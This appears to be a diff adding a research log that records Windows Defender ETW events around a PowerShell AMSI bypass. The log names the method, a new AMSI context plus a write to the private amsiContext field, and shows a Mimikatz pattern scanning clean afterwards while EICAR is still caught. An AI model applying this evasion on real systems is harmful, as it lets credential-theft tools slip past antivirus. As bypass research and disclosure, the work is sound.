@@ -1,0 +1,37 @@
+# Defender's own ETW event-1101 across the shedskin boundary
+# Captured 2026-10-29 on win11 26200.8037, Defender sig 1.459.576.0, engine 1.1.26080.3
+# Provider GUID {2A576B87-09A7-520E-C21A-4942F0271D67} (Microsoft-Antimalware-Scan-Interface)
+# logman trace -> tracerpt XML, parsed field-by-field
+#
+# All scans in one powershell.exe process (PID 4280). Same payload bytes
+# scanned through [AmsiUtils]::amsiContext before and after shedskin.
+
+pre_mimikatz_via_psCtx            result=32768 DETECTED (via [AmsiUtils]::amsiContext=0x276b98df520, SMA's real PS context, appname=PowerShell_<path>_<ver>)
+pre_eicar_via_psCtx               result=32768 DETECTED (oracle, same context)
+
+AmsiInitialize('x') -> newCtx=0x276b9bc5e80
+Field-write: [AmsiUtils]::amsiContext = 0x276b9bc5e80 (now the x context)
+
+post_mimikatz_via_newCtx          result=1     CLEAN     (same bytes, same PID, now through swapped context)
+post_eicar_via_newCtx             result=32768 DETECTED  (universal sig fires through swapped context too)
+
+# Defender's OWN ETW provider confirmed BOTH the bypass AND the scope ceiling:
+#   2026-10-29T16:35:51.736  Id=1101  appname='x'  scanResult=1       size=55  (post_mimikatz_via_newCtx)
+#   2026-10-29T16:35:51.744  Id=1101  appname='x'  scanResult=32768   size=68  (post_eicar_via_newCtx)
+# The appname field now reads 'x' instead of 'PowerShell_...' because the
+# AMSI_CONTEXT the second scan went through was minted with that appname.
+# Defender logs the appname AS STORED IN THE CONTEXT STRUCT, which is why the
+# ETW evidence tracks the field-write exactly.
+
+# What this proves:
+# 1) The bypass is real end-to-end for the PS-pack-exclusive sig: same bytes,
+#    same PID, pre reads 32768 and post reads 1. Not a probe-side artifact.
+# 2) EICAR through the same swapped context reads 32768. That is the scope
+#    ceiling IN THE SAME CAPTURE: the Mimikatz pattern lives in the PS pack
+#    and routing moves it; EICAR lives in every pack and routing cannot move
+#    it.
+# 3) Defender's own ETW provider (not our probe) emits scanResult=1 on the
+#    Mimikatz-pattern post-shedskin. The event-1101 record is Defender logging
+#    its own verdict.
+
+sig=1.459.576.0 engine=1.1.26080.3 build=10.0.26200 process_id=4280
